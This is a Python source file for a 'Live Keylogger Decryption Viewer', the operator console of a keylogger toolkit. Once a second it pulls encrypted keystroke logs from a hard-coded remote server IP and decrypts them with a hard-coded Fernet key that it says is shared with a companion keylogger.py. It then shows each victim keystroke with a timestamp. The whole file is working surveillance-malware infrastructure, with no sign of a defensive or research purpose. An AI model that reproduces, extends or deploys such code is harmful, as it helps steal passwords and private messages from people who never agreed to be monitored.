import tkinter as tk
from tkinter import scrolledtext
import requests
import time
from cryptography.fernet import Fernet

# === Your Secret Key (same as keylogger.py)
SECRET_KEY = b'j5uZ5X8DnqoLk7miCltsA8wrfNg-7dLGp1Ns5XGMQ4g='
cipher_suite = Fernet(SECRET_KEY)

# === Your Flask server endpoint
SERVER_VIEW_URL = 'http://54.87.241.76:5000/view'

class LiveDecryptionGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Live Keylogger Decryption Viewer - Organized")
        self.root.geometry("850x600")

        self.text_area = scrolledtext.ScrolledText(root, wrap=tk.WORD, font=("Courier", 12))
        self.text_area.pack(expand=True, fill=tk.BOTH, padx=10, pady=10)
        self.text_area.config(state=tk.DISABLED)

        self.seen_lines = set()

        # Add header once
        self.text_area.config(state=tk.NORMAL)
        self.text_area.insert(tk.END, f"{'Timestamp':<25} | {'Keystroke'}\n")
        self.text_area.insert(tk.END, "-"*50 + "\n")
        self.text_area.config(state=tk.DISABLED)

        self.update_logs()

    def update_logs(self):
        try:
            response = requests.get(SERVER_VIEW_URL, timeout=5)
            if response.status_code == 200:
                encrypted_lines = response.text.strip().split('\n')

                new_text = ""
                for line in encrypted_lines:
                    line = line.strip()
                    if line and line not in self.seen_lines:
                        self.seen_lines.add(line)
                        try:
                            decrypted = cipher_suite.decrypt(line.encode('utf-8')).decode('utf-8')

                            # Split decrypted message into timestamp and key
                            if "]" in decrypted:
                                timestamp, key = decrypted.split("]", 1)
                                timestamp = timestamp.replace("[", "").strip()
                                key = key.strip()

                                new_text += f"{timestamp:<25} | {key}\n"
                            else:
                                # if no clear split
                                new_text += f"UNKNOWN TIME           | {decrypted}\n"

                        except Exception:
                            new_text += f"ERROR                  | [FAILED DECRYPT]\n"

                if new_text:
                    self.text_area.config(state=tk.NORMAL)
                    self.text_area.insert(tk.END, new_text)
                    self.text_area.config(state=tk.DISABLED)
                    self.text_area.yview(tk.END)

        except Exception as e:
            self.text_area.config(state=tk.NORMAL)
            self.text_area.insert(tk.END, f"\n[ERROR] {e}\n")
            self.text_area.config(state=tk.DISABLED)

        # Refresh every 1 second
        self.root.after(1000, self.update_logs)

if __name__ == "__main__":
    root = tk.Tk()
    app = LiveDecryptionGUI(root)
    root.mainloop()
